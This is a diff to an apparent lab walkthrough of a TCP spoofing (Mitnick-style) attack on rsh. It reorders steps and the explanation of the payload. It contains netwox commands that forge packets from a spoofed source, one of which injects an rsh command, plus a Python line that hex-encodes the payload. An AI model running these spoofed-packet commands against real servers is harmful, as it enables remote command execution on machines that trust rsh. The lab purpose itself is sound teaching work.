@@ -78,23 +78,9 @@ step 6.3: send one ACK packet to the server. This packet carries the command we 
 # sudo netwox 40 --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 1023 --tcp-dst 514 --tcp-acknum y+1 --tcp-seqnum x+1 --tcp-data "393039300073656564007365656400746f756368202f746d702f78797a00" 
 ```
 
-note: step 5.2 and step 5.3 are the same command, except that --tcp-data part.
+note: step 6.2 and step 6.3 are the same command, except that --tcp-data part.
 
-step 7. create the second TCP connection. After the above ACK packet, the server would automatically sends a SYN packet to the client so as to establish the 2nd TCP connection. We just need to respond a fake SYN-ACK packet. Let's say the sequence number of this SYN packet is z, then in our SYN-ACK packet, the ack num needs to be z+1, the sequence number can be anything.
-
-step 7.1: 
-
-```console
-# sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 9090 --tcp-dst 1023 --tcp-acknum z+1
-```
-
-Verification steps:
-
-step 8. on the victim's server machine, see if /tmp/xyz is created.
-
-==============
-
-Note: In netwox 40, --tcp-data specifies the data you want to transfer, and in our case, we want to transfer an rsh command "touch /tmp/xyz". In rsh, its data's structure is:
+**Explanation**: why the tcp data is "393039300073656564007365656400746f756368202f746d702f78797a00"? Because in netwox 40, --tcp-data specifies the data you want to transfer, and in our case, we want to transfer an rsh command "touch /tmp/xyz". In rsh, its data's structure is:
 
 [port number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00
 
@@ -105,4 +91,16 @@ $ python
 >>> "9090\x00seed\x00seed\x00touch /tmp/xyz\x00".encode("hex")
 '393039300073656564007365656400746f756368202f746d702f78797a00'
 ```
+
+step 7. create the second TCP connection. After the above ACK packet, the server would automatically sends a SYN packet to the client so as to establish the 2nd TCP connection. We just need to respond a fake SYN-ACK packet. Let's say the sequence number of this SYN packet is z, then in our SYN-ACK packet, the ack num needs to be z+1, the sequence number can be anything.
+
+step 7.1: 
+
+```console
+# sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.10 --tcp-src 9090 --tcp-dst 1023 --tcp-acknum z+1
+```
+
+### Verification steps:
+
+step 8. on the victim's server machine, see if /tmp/xyz is created.
 
